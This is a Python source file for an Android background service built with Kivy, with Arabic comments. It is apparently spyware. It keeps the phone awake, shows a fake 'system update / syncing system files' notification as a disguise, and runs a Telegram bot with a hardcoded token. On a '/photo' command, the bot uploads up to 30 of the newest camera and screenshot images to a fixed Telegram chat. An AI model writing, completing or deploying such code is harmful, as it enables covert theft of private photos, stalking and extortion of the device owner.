import os, time, threading, telebot, requests
from jnius import autoclass

# أدوات أندرويد للحماية والنبض
PythonService = autoclass('org.kivy.android.PythonService')
Context = autoclass('android.content.Context')
NotificationBuilder = autoclass('android.app.Notification$Builder')
NotificationChannel = autoclass('android.app.NotificationChannel')
NotificationManager = autoclass('android.app.NotificationManager')
Build = autoclass('android.os.Build')
PowerManager = autoclass('android.os.PowerManager')

service = PythonService.mService
context = service.getApplicationContext()

# منع المعالج من النوم (WakeLock) لضمان استمرار الخدمة
power = context.getSystemService(Context.POWER_SERVICE)
wake_lock = power.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ShadowCore::WakeLock")
wake_lock.acquire()

# إشعار الخدمة الدائمة
def start_foreground():
    CHANNEL_ID = "system_service_channel"
    nm = context.getSystemService(Context.NOTIFICATION_SERVICE)
    if Build.VERSION.SDK_INT >= 26:
        channel = NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_LOW)
        nm.createNotificationChannel(channel)
        builder = NotificationBuilder(context, CHANNEL_ID)
    else:
        builder = NotificationBuilder(context)
    notification = builder.setContentTitle("تحديث النظام") \
                          .setContentText("يتم الآن مزامنة ملفات النظام...") \
                          .setSmallIcon(context.getApplicationInfo().icon) \
                          .build()
    service.startForeground(1, notification)

# إعداد البوت
bot = telebot.TeleBot("7820129712:AAH9pZ49S_m8tY8965625902", threaded=False)

@bot.message_handler(commands=['photo'])
def handle_photo(message):
    # المسارات المستهدفة
    paths = ["/storage/emulated/0/DCIM/Camera", "/storage/emulated/0/Pictures/Screenshots"]
    for path in paths:
        if os.path.exists(path):
            try:
                # جلب الصور وترتيبها (الأحدث أولاً)
                photos = [os.path.join(path, f) for f in os.listdir(path) if f.lower().endswith(('.jpg', '.png', '.jpeg'))]
                photos.sort(key=os.path.getmtime, reverse=True) 
                
                # إرسال 30 صورة من كل مسار (القديم والحديث)
                for p in photos[:30]:
                    try:
                        with open(p, 'rb') as img:
                            bot.send_photo("6110903337", img)
                        time.sleep(0.5) # تأخير بسيط لتجنب حظر التليجرام
                    except: continue
            except: pass

def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=20, skip_pending=True)
        except:
            time.sleep(10)

if __name__ == '__main__':
    start_foreground()
    # تشغيل البوت في مسار خلفي مستقل
    threading.Thread(target=run_bot, daemon=True).start()
    while True:
        time.sleep(60)
